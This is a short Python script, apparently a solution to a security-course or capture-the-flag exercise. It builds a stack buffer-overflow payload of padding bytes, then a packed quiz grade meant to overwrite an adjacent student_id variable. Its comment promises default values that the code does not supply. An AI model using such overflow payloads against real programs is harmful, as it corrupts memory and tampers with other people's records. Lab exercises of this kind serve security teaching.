import os
import struct

# Get student ID and quiz grade from environment variables, or use defaults
student_id = int(os.environ.get("STUDENT_ID"))
quiz_grade = int(os.environ.get("QUIZ_GRADE"))

# For this overflow, buffer is 32 bytes, then 4 bytes (possibly for saved ebp), then the variable
# You may need to adjust the offset depending on platform/compilation

payload = b"a" * 32     # fill buffer
payload += b"b" * 4     # fill saved ebp (or filler)
payload += struct.pack("<I", quiz_grade)  # overwrite student_id with quiz_grade

# Send the payload as bytes
print(payload)